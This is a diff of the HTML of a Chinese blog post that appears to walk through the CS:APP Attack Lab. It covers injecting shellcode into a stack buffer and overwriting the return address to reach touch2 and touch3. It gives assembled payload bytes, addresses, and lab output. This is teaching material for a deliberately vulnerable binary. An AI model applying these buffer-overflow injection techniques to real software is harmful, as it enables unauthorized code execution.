-<p>那么我们可以判断 buf 的起始位置是 <code>0x5561dc78</code> ，返回地址的位置在其后 40 个字节处，也就是 <code>0x5561dca0</code> 。那么我们需要让 return address (buf 最后 8 个字节) 的值等于 <code>0x5561dc78</code> 。换成小端序就是 <code>0x78 0xdc 0x61 0x55</code> 。</p>
+<p>那么我们可以判断 buf 的起始位置是<code>0x5561dc78</code>，返回地址的位置在其后 40 个字节处，也就是<code>0x5561dca0</code>。那么我们需要让 return address(buf 最后 8 个字节)的值等于<code>0x5561dc78</code>。换成小端序就是<code>0x78 0xdc 0x61 0x55</code>。</p>
 <p>第二条要生成的指令应该是:</p>
 <pre><code>movl $0x6044e4,%eax
 movl (%eax),%edi
@@ -106,8 +123,8 @@ movl (%eax),%edi
 <pre><code>subq $0x8,%rsp
 movl 0x4017ec,($rsp)
 </code></pre>
-<p>最后一条插入的指令是 <code>ret</code> ，在这个过程中， <code>%rsp</code>  处的内容会被赋值给 <code>%rip</code> ， <code>%rsp</code>  会自动加上 8。</p>
-<p>最后插入数条 <code>nop</code>  指令实现 PC 的顺序累加。</p>
+<p>最后一条插入的指令是<code>ret</code>，在这个过程中，<code>%rsp</code>处的内容会被赋值给<code>%rip</code>，<code>%rsp</code>会自动加上 8。</p>
+<p>最后插入数条<code>nop</code>指令实现 PC 的顺序累加。</p>
 <p>由于这些指令在 Appendix A 表格中没有，所以我们需要手动生成。我们将如下内容保存在文件中：</p>
 <pre><code>    movl $0x6044e4,%eax
     movl (%eax),%edi
@@ -119,7 +136,7 @@ movl 0x4017ec,($rsp)
     nop
     nop
 </code></pre>
-<p>然后使用 <code>gcc -c ph2.s</code>  生成 <code>ph2.o</code>  文件，然后使用 <code>objdump -d ph2.o &gt; ph2.d</code> ，打开 <code>ph2.d</code> ，有如下内容：</p>
+<p>然后使用<code>gcc -c ph2.s</code>生成<code>ph2.o</code>文件，然后使用<code>objdump -d ph2.o &gt; ph2.d</code>，打开<code>ph2.d</code>，有如下内容：</p>
 <pre><code>
 ph2.o:     file format elf64-x86-64
 
@@ -137,32 +154,62 @@ Disassembly of section .text:
   16:	90                   	nop
   17:	90                   	nop
 </code></pre>
-<p>那么我们所需要的字节就是 <code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3</code> ，共 20 字节。后续再插入 20 个字节的 <code>nop</code> (0x90)</p>
-<p>完整的字符串是 <code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55</code> ，我将其保存在 <code>phase2.txt</code>  中。</p>
+<p>那么我们所需要的字节就是<code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3</code>，共 20 字节。后续再插入 20 个字节的<code>nop</code>(0x90)</p>
+<p>完整的字符串是<code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55</code>，我将其保存在<code>phase2.txt</code>中。</p>
 <blockquote>
-<p>注：一开始把 <code>0x5561dc78</code>  打成了 <code>0x5564dc78</code>  导致出现访问了未被初始化的位置，出现了 segmentation fault。在输入地址的时候要小心谨慎，不要出现太多问题。</p>
-<p>此外，注入代码的时候需要手动添加 <code>ret</code>  指令，否则程序不知道要返回，就算 buffer overflow 覆盖了返回地址也没用。</p>
+<p>注：一开始把<code>0x5561dc78</code>打成了<code>0x5564dc78</code>导致出现访问了未被初始化的位置，出现了 segmentation fault。在输入地址的时候要小心谨慎，不要出现太多问题。</p>
+<p>此外，注入代码的时候需要手动添加<code>ret</code>指令，否则程序不知道要返回，就算 buffer overflow 覆盖了返回地址也没用。</p>
 </blockquote>
 <p>结果如下：</p>
-<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num="2"></td><td><pre>Type string:Touch2<span class="token operator">!</span>: You called touch2<span class="token punctuation">(</span>0x59b997fa<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Valid solution <span class="token keyword">for</span> level <span class="token number">2</span> with target ctarget</pre></td></tr><tr><td data-num="4"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num="5"></td><td><pre>        user <span class="token function">id</span> bovik</pre></td></tr><tr><td data-num="6"></td><td><pre>        course  <span class="token number">15213</span>-f15</pre></td></tr><tr><td data-num="7"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num="8"></td><td><pre>        result  <span class="token number">1</span>:PASS:0xffffffff:ctarget:2:B8 E4 <span class="token number">44</span> <span class="token number">60</span> 00 <span class="token number">67</span> 8B <span class="token number">38</span> <span class="token number">48</span> <span class="token number">83</span> EC 08 C7 04 <span class="token number">24</span> EC <span class="token number">17</span> <span class="token number">40</span> 00 C3 <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">78</span> DC <span class="token number">61</span> <span class="token number">55</span></pre></td></tr></table></figure><p>成功！</p>
-<h3 id="phase-3在-buf-中插入所需字符串和攻击代码并覆盖返回地址"><a class="markdownIt-Anchor" href="#phase-3在-buf-中插入所需字符串和攻击代码并覆盖返回地址">#</a> Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址</h3>
-<p>在 phase 3 中，我们需要让程序在 <code>getbuf</code>  后，运行 <code>touch3</code>  函数，其注入方式和 phase 2 类似。（此处需要利用 <code>vlevel = 3</code>  进行跳转后验证，因此和上次一样，我们不能直接跳转到 <code>Touch3!</code>  语句，还是需要注入代码，将 <code>%rdi</code>  设置为 <code>cookie</code>  的值，然后再引导程序跳转到 <code>touch3</code>  的开头语句）。 <code>touch3</code>  函数的 C 语言版本如下：</p>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">/* Compare string to hex represention of unsigned value */</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">/* Make position of check string unpredictable */</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3("</span><span class="token operator">%</span>s<span class="token string">")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3("</span><span class="token operator">%</span>s<span class="token string">")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h4 id="一开始的错误解答"><a class="markdownIt-Anchor" href="#一开始的错误解答">#</a> 一开始的错误解答</h4>
-<p>这里的差别在于我们输入的 <code>string</code>  是一个 <code>cookie</code>  的字符串表示。我们对 <code>touch3</code>  做反汇编看看 <code>cookie</code>  的字符串表示存在哪里？</p>
+<pre><code class="bash">Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:B8 E4 44 60 00 67 8B 38 48 83 EC 08 C7 04 24 EC 17 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55
+</code></pre>
+<p>成功！</p>
+<h3 id="Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址"><a href="#Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址" class="headerlink" title="Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址"></a>Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址</h3><p>在 phase 3 中，我们需要让程序在<code>getbuf</code>后，运行<code>touch3</code>函数，其注入方式和 phase 2 类似。（此处需要利用<code>vlevel = 3</code>进行跳转后验证，因此和上次一样，我们不能直接跳转到<code>Touch3!</code>语句，还是需要注入代码，将<code>%rdi</code>设置为<code>cookie</code>的值，然后再引导程序跳转到<code>touch3</code>的开头语句）。<code>touch3</code>函数的 C 语言版本如下：</p>
+<pre><code class="c">/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval)
+&#123;
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, &quot;%.8x&quot;, val);
+    return strncmp(sval, s, 9) == 0;
+&#125;
+
+void touch3(char *sval)
+&#123;
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) &#123;
+        printf(&quot;Touch3!: You called touch3(&quot;%s&quot;)\n&quot;, sval);
+        validate(3);
+    &#125; else &#123;
+        printf(&quot;Misfire: You called touch3(&quot;%s&quot;)\n&quot;, sval);
+        fail(3);
+    &#125;
+    exit(0);
+&#125;
+</code></pre>
+<h4 id="一开始的错误解答"><a href="#一开始的错误解答" class="headerlink" title="一开始的错误解答"></a>一开始的错误解答</h4><p>这里的差别在于我们输入的<code>string</code>是一个<code>cookie</code>的字符串表示。我们对<code>touch3</code>做反汇编看看<code>cookie</code>的字符串表示存在哪里？</p>
 <pre><code>   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;
 </code></pre>
-<p>我们输入 <code>x/s 0x6044e4</code>  看看结果：</p>
+<p>我们输入<code>x/s 0x6044e4</code>看看结果：</p>
 <pre><code>(gdb) x/s 0x6044e4
 0x6044e4 &lt;cookie&gt;:      &quot;&quot;
 </code></pre>
-<p>这里同样，可以看出来和上一次的 <code>cookie</code>  放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值 <code>%rdi</code>  设置为 <code>0x6044e4</code>  位置的值。而这次 <code>%rdi</code>  指向输入的字符串，我们需要做的是将 <code>%rdi</code>  设置为 <code>0x6044e4</code> 。</p>
-<p>此外， <code>touch3</code>  的入口地址为 <code>0x4018fa</code> 。因此在最后需要让 return address 等于这个值。</p>
+<p>这里同样，可以看出来和上一次的<code>cookie</code>放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值<code>%rdi</code>设置为<code>0x6044e4</code>位置的值。而这次<code>%rdi</code>指向输入的字符串，我们需要做的是将<code>%rdi</code>设置为<code>0x6044e4</code>。</p>
+<p>此外，<code>touch3</code>的入口地址为<code>0x4018fa</code>。因此在最后需要让 return address 等于这个值。</p>
 <p>那么总体的注入和上次遵循一样的步骤：</p>
 <ol>
-<li>让 return address 等于 buf 的开头 ( <code>0x5561dc78</code> )</li>
-<li>在 buf 开头插入赋值语句，让 <code>%edi = 0x6044e4</code></li>
-<li>让 return address = touch3 的入口地址 ( <code>0x4018fa</code> )</li>
-<li>调用 <code>ret</code></li>
+<li>让 return address 等于 buf 的开头(<code>0x5561dc78</code>)</li>
+<li>在 buf 开头插入赋值语句，让<code>%edi = 0x6044e4</code></li>
+<li>让 return address &#x3D; touch3 的入口地址(<code>0x4018fa</code>)</li>
+<li>调用<code>ret</code></li>
 </ol>
 <p>综上，这次的调用语句是：</p>
 <pre><code>    movl $0x6044e4,%edi
@@ -174,7 +221,7 @@ Disassembly of section .text:
     nop
     nop
 </code></pre>
-<p>将其保存在 <code>ph3.s</code>  中，输入 <code>gcc -c ph3.s</code>  生成 <code>ph3.o</code>  文件，再 <code>objdump -d ph3.o &gt; ph3.d</code> ，生成 <code>ph3.d</code>  文件。</p>
+<p>将其保存在<code>ph3.s</code>中，输入<code>gcc -c ph3.s</code>生成<code>ph3.o</code>文件，再<code>objdump -d ph3.o &gt; ph3.d</code>，生成<code>ph3.d</code>文件。</p>
 <p>文件内容如下：</p>
 <pre><code>
 ph3.o:     file format elf64-x86-64
@@ -191,50 +238,56 @@ Disassembly of section .text:
   12:	90                   	nop
   13:	90                   	nop
   14:	90                   	nop
-
 </code></pre>
-<p>那么其一直到 <code>ret</code>  的字节即为 <code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code> 。一共 17 个字节。将其字节复制到 <code>phase3.txt</code>  的最前面。添加 23 个 <code>nop</code> ( <code>0x90</code> ) 凑齐 40 个字节，最后 8 个字节的值必须等于 <code>0x5561dc78</code> 。换成小端序就是 <code>0x78 0xdc 0x61 0x55</code> 。</p>
+<p>那么其一直到<code>ret</code>的字节即为<code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code>。一共 17 个字节。将其字节复制到<code>phase3.txt</code>的最前面。添加 23 个<code>nop</code>(<code>0x90</code>)凑齐 40 个字节，最后 8 个字节的值必须等于<code>0x5561dc78</code>。换成小端序就是<code>0x78 0xdc 0x61 0x55</code>。</p>
 <p>完整字符串如下：</p>
 <pre><code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55
 </code></pre>
-<p>输入 <code>./hex2raw &lt; phase3.txt | ./ctarget </code> 。结果如下：</p>
-<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num="2"></td><td><pre>Type string:Misfire: You called touch3<span class="token punctuation">(</span><span class="token string">"���Y"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>FAIL: Would have posted the following:</pre></td></tr><tr><td data-num="4"></td><td><pre>        user <span class="token function">id</span> bovik</pre></td></tr><tr><td data-num="5"></td><td><pre>        course  <span class="token number">15213</span>-f15</pre></td></tr><tr><td data-num="6"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num="7"></td><td><pre>        result  <span class="token number">1</span>:FAIL:0xffffffff:ctarget:3:BF E4 <span class="token number">44</span> <span class="token number">60</span> 00 <span class="token number">48</span> <span class="token number">83</span> EC 08 C7 04 <span class="token number">24</span> FA <span class="token number">18</span> <span class="token number">40</span> 00 C3 <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">78</span> DC <span class="token number">61</span> <span class="token number">55</span></pre></td></tr></table></figure><p>最后确实跳转到了 <code>touch3</code> ，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽)</p>
-<h4 id="忽略随机栈空间的不正确解答"><a class="markdownIt-Anchor" href="#忽略随机栈空间的不正确解答">#</a> 忽略随机栈空间的不正确解答</h4>
-<p>我们最早是认为，应该让 <code>%edi</code>  指向 <code>0x6044e4</code> ，也就是 <code>cookie</code>  字符串所在的位置，来让 <code>%edi</code>  和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现， <code>cookie</code>  不是个字符串，还是个 <code>unsigned</code>  类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让 <code>输入的字符串</code> 和 <code>打印出来的 cookie 的值</code> 相同。所以这里不能让 <code>%rdi</code>  指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给 <code>%rdi</code> ，然后让 <code>%rdi</code>  和 <code>cookie</code>  的打印版进行比较。</p>
-<p>那么 <code>cookie</code>  的值是多少？我们使用 <code>p /x cookie</code>  命令打印一下：</p>
+<p>输入<code>./hex2raw &lt; phase3.txt | ./ctarget </code>。结果如下：</p>
+<pre><code class="bash">Cookie: 0x59b997fa
+Type string:Misfire: You called touch3(&quot;���Y&quot;)
+FAIL: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55
+</code></pre>
+<p>最后确实跳转到了<code>touch3</code>，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽)</p>
+<h4 id="忽略随机栈空间的不正确解答"><a href="#忽略随机栈空间的不正确解答" class="headerlink" title="忽略随机栈空间的不正确解答"></a>忽略随机栈空间的不正确解答</h4><p>我们最早是认为，应该让<code>%edi</code>指向<code>0x6044e4</code>，也就是<code>cookie</code>字符串所在的位置，来让<code>%edi</code>和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，<code>cookie</code>不是个字符串，还是个<code>unsigned</code>类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让<code>输入的字符串</code>和<code>打印出来的 cookie 的值</code>相同。所以这里不能让<code>%rdi</code>指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给<code>%rdi</code>，然后让<code>%rdi</code>和<code>cookie</code>的打印版进行比较。</p>
+<p>那么<code>cookie</code>的值是多少？我们使用<code>p /x cookie</code>命令打印一下：</p>
 <pre><code>(gdb) p /x cookie
 $4 = 0x59b997fa
 </code></pre>
-<p>所以输入的字符串应该是 <code>0x59b997fa</code> 。</p>
+<p>所以输入的字符串应该是<code>0x59b997fa</code>。</p>
 <p>经过阅读 attacklab.pdf，作者给出了以下几个提示：</p>
 <ol>
 <li>攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x）</li>
-<li>字符串最后应该有个 0，输入 <code>man ascii</code>  在 Linux 中查找 ascii 表</li>
-<li>攻击代码应该让 <code>%rdi</code>  的值等于这个字符串的起始地址</li>
-<li><code>hexmatch</code>  和 <code>strncmp</code>  可能会覆盖一部分 <code>getbuf</code>  中的 buf，注意不要让你的攻击字符串被覆盖掉。</li>
+<li>字符串最后应该有个 0，输入<code>man ascii</code>在 Linux 中查找 ascii 表</li>
+<li>攻击代码应该让<code>%rdi</code>的值等于这个字符串的起始地址</li>
+<li><code>hexmatch</code>和<code>strncmp</code>可能会覆盖一部分<code>getbuf</code>中的 buf，注意不要让你的攻击字符串被覆盖掉。</li>
 </ol>
 <p>那么初始的准备工作应该是：</p>
 <ol>
-<li>确定插入字符串和攻击代码的有效区域，防止被 <code>hexmatch</code>  和 <code>strncmp</code>  影响到</li>
-<li>查找 <code>cookie</code>  字符串的编码，加上一个 <code>\0</code> ，并插入到攻击代码之前</li>
+<li>确定插入字符串和攻击代码的有效区域，防止被<code>hexmatch</code>和<code>strncmp</code>影响到</li>
+<li>查找<code>cookie</code>字符串的编码，加上一个<code>\0</code>，并插入到攻击代码之前</li>
 <li>确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节</li>
 </ol>
 <p>在攻击代码中所做的工作应该是：</p>
 <ol>
-<li>让 <code>%rdi = 插入字符串的起始位置</code></li>
-<li>将 <code>touch3</code>  的起始位置插入到返回地址处</li>
-<li>调用 <code>ret</code>  返回</li>
-<li>通过多个 <code>nop</code>  填充字符串（也可以不填充？）</li>
+<li>让<code>%rdi = 插入字符串的起始位置</code></li>
+<li>将<code>touch3</code>的起始位置插入到返回地址处</li>
+<li>调用<code>ret</code>返回</li>
+<li>通过多个<code>nop</code>填充字符串（也可以不填充？）</li>
 </ol>
-<p>我们首先确定 <code>getbuf</code>  的 <code>buf</code>  范围， <code>hexmatch</code>  的辐射范围和 <code>strncmp</code>  的辐射范围。</p>
+<p>我们首先确定<code>getbuf</code>的<code>buf</code>范围，<code>hexmatch</code>的辐射范围和<code>strncmp</code>的辐射范围。</p>
 <p>通过<a href="#phase-2%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">前文</a>我们分析过：</p>
 <ol>
-<li>调用 <code>getbuf</code>  之前:  <code>0x5561dca8</code></li>
-<li>调用 <code>getbuf</code>  之后:  <code>0x5561dca0</code></li>
-<li>调用 <code>rsp = rsp - 40</code>  之后:  <code>0x5561dc78</code></li>
+<li>调用<code>getbuf</code>之前: <code>0x5561dca8</code></li>
+<li>调用<code>getbuf</code>之后: <code>0x5561dca0</code></li>
+<li>调用<code>rsp = rsp - 40</code>之后: <code>0x5561dc78</code></li>
 </ol>
-<p>可以了解到 <code>buf</code>  的范围是： <code>0x5561dc78 ~ 0x5561dc9f</code> ， <code>buf</code>  后 8 个字节的返回地址的位置是 <code>0x5561dca0</code> 。</p>
-<p>对 <code>touch3</code>  进行反汇编可得：</p>
+<p>可以了解到<code>buf</code>的范围是：<code>0x5561dc78 ~ 0x5561dc9f</code>，<code>buf</code>后 8 个字节的返回地址的位置是<code>0x5561dca0</code>。</p>
+<p>对<code>touch3</code>进行反汇编可得：</p>
 <pre><code>Dump of assembler code for function touch3:
    0x00000000004018fa &lt;+0&gt;:     push   %rbx
    0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx
@@ -263,7 +316,7 @@ $4 = 0x59b997fa
    0x0000000000401963 &lt;+105&gt;:   callq  0x400e40 &lt;exit@plt&gt;
 End of assembler dump.
 </code></pre>
-<p>对 <code>hexmatch</code>  进行反汇编可得：</p>
+<p>对<code>hexmatch</code>进行反汇编可得：</p>
 <pre><code>Dump of assembler code for function hexmatch:
    0x000000000040184c &lt;+0&gt;:     push   %r12
    0x000000000040184e &lt;+2&gt;:     push   %rbp
@@ -313,7 +366,7 @@ End of assembler dump.
    0x00000000004018f9 &lt;+173&gt;:   retq
 End of assembler dump.
 </code></pre>
-<p>对 <code>strncmp</code>  进行反汇编可得：</p>
+<p>对<code>strncmp</code>进行反汇编可得：</p>
 <pre><code>Dump of assembler code for function strncmp_ifunc:
    0x00007ffff7e54710 &lt;+0&gt;:     endbr64
    0x00007ffff7e54714 &lt;+4&gt;:     mov    0x14c745(%rip),%rcx        # 0x7ffff7fa0e60
@@ -354,22 +407,22 @@ hex2match后：
 strncmp:
     retq
 </code></pre>
-<p>由于 <code>hexmatch</code>  和 <code>strncmp</code>  是在 <code>touch3</code>  里面调用的，而 <code>touch3</code>  是在执行攻击代码之后调用，在攻击代码中我们将 <code>%rdi</code>  指向字符串的地址，因此我们需要保证的是 <code>touch3</code>  中的 <code>push</code>  和 <code>pop</code>  指令不影响之前的字符串，以免影响 <code>%rdi</code>  指向的值。</p>
-<p>在调用 <code>touch3</code>  之前，我们刚刚执行了 <code>ret</code>  指令，其作用是将返回地址赋值给 <code>%rip</code>  并弹出，操作完成后 <code>%rsp</code>  应该在 <code>buf + 48</code>  位置处。我们是通过直接返回到 <code>touch3</code>  的开头位置来执行 <code>touch3</code>  的，而不是 <code>callq touch3</code> ，因此无需往栈中压入下一条指令的地址（当然这里也没有下一条啦～）</p>
+<p>由于<code>hexmatch</code>和<code>strncmp</code>是在<code>touch3</code>里面调用的，而<code>touch3</code>是在执行攻击代码之后调用，在攻击代码中我们将<code>%rdi</code>指向字符串的地址，因此我们需要保证的是<code>touch3</code>中的<code>push</code>和<code>pop</code>指令不影响之前的字符串，以免影响<code>%rdi</code>指向的值。</p>
+<p>在调用<code>touch3</code>之前，我们刚刚执行了<code>ret</code>指令，其作用是将返回地址赋值给<code>%rip</code>并弹出，操作完成后<code>%rsp</code>应该在<code>buf + 48</code>位置处。我们是通过直接返回到<code>touch3</code>的开头位置来执行<code>touch3</code>的，而不是<code>callq touch3</code>，因此无需往栈中压入下一条指令的地址（当然这里也没有下一条啦~）</p>
 <p>通过上述过程分析我们可以看到，栈的最低位置应该是在经过了一下几个步骤之后：</p>
 <ol>
-<li><code>push %rbx</code> ，这里压入了 rbx，栈位置来到了 <code>buf + 40</code></li>
-<li><code>callq hex2match</code> ，这里压入了 <code>callq</code>  的下一条指令的地址，栈位置来到了 <code>buf + 32</code></li>
-<li><code>push r12</code> ，压入了 <code>r12</code> ，栈位置来到了 <code>buf + 24</code></li>
-<li><code>push rbp</code> ，压入了 <code>rbp</code> ，栈位置来到了 <code>buf + 16</code></li>
-<li><code>push rbx</code> ，压入了 <code>rbx</code> ，栈位置来到了 <code>buf + 8</code></li>
+<li><code>push %rbx</code>，这里压入了 rbx，栈位置来到了<code>buf + 40</code></li>
+<li><code>callq hex2match</code>，这里压入了<code>callq</code>的下一条指令的地址，栈位置来到了<code>buf + 32</code></li>
+<li><code>push r12</code>，压入了<code>r12</code>，栈位置来到了<code>buf + 24</code></li>
+<li><code>push rbp</code>，压入了<code>rbp</code>，栈位置来到了<code>buf + 16</code></li>
+<li><code>push rbx</code>，压入了<code>rbx</code>，栈位置来到了<code>buf + 8</code></li>
 </ol>
-<p>后续主要执行的都是 <code>pop</code>  和 <code>retq</code>  操作，虽然有一个 <code>callq strncmp</code> ，但是栈的位置不可能低于 <code>buf + 8</code> 。因此我们插入的字符串必须在 <code>buf + 8</code>  之前。我们输入的字符串刚好是 8 个字符，1 个字符一个字节，也刚好是 8 个字节，那么就应当插在 <code>buf</code>  处。从 <code>buf + 8</code>  处开始插入攻击代码。</p>
+<p>后续主要执行的都是<code>pop</code>和<code>retq</code>操作，虽然有一个<code>callq strncmp</code>，但是栈的位置不可能低于<code>buf + 8</code>。因此我们插入的字符串必须在<code>buf + 8</code>之前。我们输入的字符串刚好是 8 个字符，1 个字符一个字节，也刚好是 8 个字节，那么就应当插在<code>buf</code>处。从<code>buf + 8</code>处开始插入攻击代码。</p>
 <p>此外：</p>
 <ol>
-<li><code>59b997fa</code>  的字符串编码应该是： <code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61</code> （插在攻击代码前）</li>
-<li><code>buf + 8</code>  处的地址是： <code>0x5561dc80</code> （插入返回地址部分），转化成小端法应该是 <code>80 dc 61 55</code></li>
-<li><code>touch3</code>  的地址是 <code>0x4018fa</code></li>
